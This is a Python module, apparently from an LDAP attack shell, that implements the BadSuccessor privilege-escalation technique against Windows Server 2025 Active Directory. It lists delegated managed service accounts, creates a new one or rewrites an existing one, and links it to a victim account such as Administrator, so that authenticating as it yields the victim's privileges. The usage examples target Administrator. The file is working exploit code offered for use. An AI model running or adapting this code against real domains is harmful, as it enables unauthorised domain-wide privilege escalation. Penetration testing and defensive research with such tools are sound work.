import logging
import random
import string
from typing import Optional

from ldap3 import MODIFY_REPLACE, Connection
from ldapdomaindump import domainDumper
from pydantic import BaseModel

from ldap_shell.ldap_modules.base_module import ArgumentType, BaseLdapModule, arg_field
from ldap_shell.utils.ldap_utils import LdapUtils

MSA_STATE_COMPLETED = 2
DMSA_FILTER = '(objectClass=msDS-DelegatedManagedServiceAccount)'


class LdapShellModule(BaseLdapModule):
    """Create or point a dMSA at a victim (BadSuccessor / Windows Server 2025)."""

    help_text = "Abuse dMSA migration (BadSuccessor): link a dMSA to any account"
    examples_text = """
    `set_badsuccessor list`
    `set_badsuccessor add Administrator`
    `set_badsuccessor add Administrator "OU=work,DC=domain,DC=local" evil`
    `set_badsuccessor set Administrator evil$`
    Inline: `ldap_shell domain.local/user:pass set_badsuccessor add Administrator`
    Needs a Windows Server 2025 schema. Create-dMSA rights on an OU, or write
    on an existing dMSA, are enough — no rights on the victim.
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        action: str = arg_field(
            description="Action: list, add or set",
            arg_type=ArgumentType.ACTION,
        )
        victim: Optional[str] = arg_field(
            None,
            description="Account whose PAC the dMSA should inherit",
            arg_type=[ArgumentType.USER, ArgumentType.COMPUTER, ArgumentType.DN],
        )
        container: Optional[str] = arg_field(
            None,
            description="OU for add, or existing dMSA for set",
            arg_type=[ArgumentType.OU, ArgumentType.DN, ArgumentType.COMPUTER],
        )
        name: Optional[str] = arg_field(
            None,
            description="New dMSA sAMAccountName (add)",
            arg_type=ArgumentType.STRING,
        )

    def __init__(self, args_dict: dict, domain_dumper: domainDumper, client: Connection, log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def _default_ou(self) -> str:
        return f'CN=Managed Service Accounts,{self.domain_dumper.root}'

    def _require_tls(self) -> bool:
        if self.client.tls_started or self.client.server.ssl:
            return True
        self.log.info('Sending StartTLS command...')
        if not self.client.start_tls():
            self.log.error('StartTLS failed. Retry with -use-ldaps')
            return False
        return True

    def _list(self, search_base: str):
        if not self.client.search(
            search_base,
            DMSA_FILTER,
            attributes=[
                'sAMAccountName',
                'msDS-ManagedAccountPrecededByLink',
                'msDS-DelegatedMSAState',
            ],
            paged_size=500,
        ):
            result = self.client.result or {}
            if result.get('result') == 32:
                self.log.info(f'No dMSA container at {search_base}')
                return
            self.log.error(f'dMSA search failed: {result}')
            return
        if not self.client.entries:
            self.log.info(f'No dMSA objects under {search_base}')
            return
        self.log.info(f'Found {len(self.client.entries)} dMSA object(s):')
        for entry in self.client.entries:
            name = entry['sAMAccountName'].value or entry.entry_dn
            link = entry['msDS-ManagedAccountPrecededByLink'].value if 'msDS-ManagedAccountPrecededByLink' in entry else None
            state = entry['msDS-DelegatedMSAState'].value if 'msDS-DelegatedMSAState' in entry else None
            self.log.info(f'  {name}  state={state}  precededBy={link or "-"}')

    def _write_link(self, dmsa_dn: str, victim_dn: str) -> bool:
        if not self.client.modify(dmsa_dn, {
            'msDS-ManagedAccountPrecededByLink': [(MODIFY_REPLACE, [victim_dn])],
            'msDS-DelegatedMSAState': [(MODIFY_REPLACE, [MSA_STATE_COMPLETED])],
        }):
            self.log.error(f'Failed to set BadSuccessor attributes: {self.client.result}')
            return False
        self.log.info(f'{dmsa_dn} now precedes {victim_dn} (msDS-DelegatedMSAState=2)')
        self.log.info('Authenticate as the dMSA to receive the victim PAC')
        return True

    def __call__(self):
        action = (self.args.action or '').lower()
        if action == 'list':
            base = self.args.container or self.domain_dumper.root
            self._list(base)
            return

        if not self.args.victim:
            self.log.error('victim is required for add/set')
            return
        victim_dn = LdapUtils.resolve_dn(self.client, self.domain_dumper, self.args.victim)
        if not victim_dn:
            self.log.error(f'Victim not found: {self.args.victim}')
            return

        if action == 'set':
            if not self.args.container:
                self.log.error('Existing dMSA name or DN is required for set')
                return
            dmsa_dn = LdapUtils.resolve_dn(self.client, self.domain_dumper, self.args.container)
            if not dmsa_dn:
                self.log.error(f'dMSA not found: {self.args.container}')
                return
            self._write_link(dmsa_dn, victim_dn)
            return

        if action != 'add':
            self.log.error('Invalid action. Use list/add/set')
            return

        if not self._require_tls():
            return

        ou = self.args.container or self._default_ou()
        raw_name = self.args.name or ('dmsa' + ''.join(random.choice(string.ascii_lowercase) for _ in range(6)))
        sam = raw_name if raw_name.endswith('$') else f'{raw_name}$'
        cn = sam[:-1]
        domain = LdapUtils.get_domain_name(self.domain_dumper.root)
        dmsa_dn = f'CN={cn},{ou}'
        attrs = {
            'sAMAccountName': sam,
            'userAccountControl': 4096,
            'msDS-DelegatedMSAState': MSA_STATE_COMPLETED,
            'msDS-ManagedPasswordInterval': 30,
            'msDS-ManagedAccountPrecededByLink': victim_dn,
            'dNSHostName': f'{cn}.{domain}',
            'cn': cn,
        }
        if not self.client.add(
            dmsa_dn,
            ['top', 'msDS-GroupManagedServiceAccount', 'msDS-DelegatedManagedServiceAccount'],
            attrs,
        ):
            result = self.client.result or {}
            message = str(result.get('message') or result.get('description') or result)
            if 'objectClass' in message.lower() or result.get('result') == 67:
                self.log.error(
                    'msDS-DelegatedManagedServiceAccount is unknown. '
                    'BadSuccessor needs a Windows Server 2025 schema'
                )
                return
            self.log.error(f'Failed to create dMSA {dmsa_dn}: {result}')
            return
        self.log.info(f'Created dMSA {sam} at {dmsa_dn} preceding {victim_dn}')
        self.log.info('Authenticate as the dMSA to receive the victim PAC')
